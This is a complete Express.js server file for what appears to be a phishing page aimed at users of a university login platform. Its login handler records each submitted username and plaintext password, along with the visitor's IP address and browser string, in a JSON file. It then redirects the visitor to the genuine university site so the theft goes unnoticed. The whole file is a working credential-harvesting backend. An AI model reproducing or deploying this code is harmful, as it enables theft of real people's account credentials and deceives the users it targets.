import express from 'express';
import path from 'path';
import fs from 'fs';
import { fileURLToPath } from 'url';

const app = express();
const PORT = 80;

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

app.use(express.urlencoded({extended:true}));
app.use(express.static(path.join(__dirname, "public")));

// Function to write JSON logs
function writeJsonLog(data) {
  const logEntry = {
    timestamp: new Date().toISOString(),
    ...data
  };
  
  const logFile = path.join(__dirname, "..",'login-logs.json');
  
  // Read existing logs or create empty array
  let logs = [];
  try {
    if (fs.existsSync(logFile)) {
      const existingLogs = fs.readFileSync(logFile, 'utf8');
      logs = JSON.parse(existingLogs);
    }
  } catch (err) {
    console.error('Error reading log file:', err);
  }
  
  // Add new log entry
  logs.push(logEntry);
  
  // Write back to file
  fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
}

app.get("/", (req, res)=>{
  res.status(200).sendFile(path.join(__dirname, "../public/index.html"))
})

app.post("/login", (req, res)=>{
  const {username, password} = req.body;
  
  // Write to JSON log file
  writeJsonLog({
    type: 'login_attempt',
    username: username,
    password: password,
    ip: req.ip,
    userAgent: req.get('User-Agent')
  });
  
  res.redirect('https://platon.vistula.edu.pl/');
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`app is listening on: http://0.0.0.0:${PORT}`);
});